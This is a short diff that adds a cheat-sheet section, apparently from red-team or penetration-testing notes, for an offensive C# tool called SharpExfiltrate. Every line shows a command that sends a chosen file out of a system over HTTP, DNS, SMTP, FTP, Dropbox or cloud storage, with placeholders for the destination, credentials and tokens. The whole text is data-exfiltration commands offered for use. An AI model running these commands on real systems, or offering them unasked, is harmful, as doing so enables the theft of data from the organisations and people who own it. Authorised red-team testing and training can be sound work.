@@ -1,0 +1,12 @@
+# ==========================
+# SharpExfiltrate (C# Tool for Data Exfiltration)
+# ==========================
+
+SharpExfiltrate.exe -l                         # Lists available exfiltration methods
+SharpExfiltrate.exe -f <file> -m http          # Exfiltrates file via HTTP
+SharpExfiltrate.exe -f <file> -m dns           # Exfiltrates file via DNS
+SharpExfiltrate.exe -f <file> -m smtp -to <email@example.com> # Sends file via SMTP
+SharpExfiltrate.exe -f <file> -m dropbox -tk <token> # Uploads to Dropbox using token
+SharpExfiltrate.exe -f <file> -m ftp -u <user> -p <pass> -h <host> # Sends file via FTP
+SharpExfiltrate.exe -f <file> -m cloud -sk <storage-key> # Uses cloud method with storage key
+SharpExfiltrate.exe -h                         # Shows help message
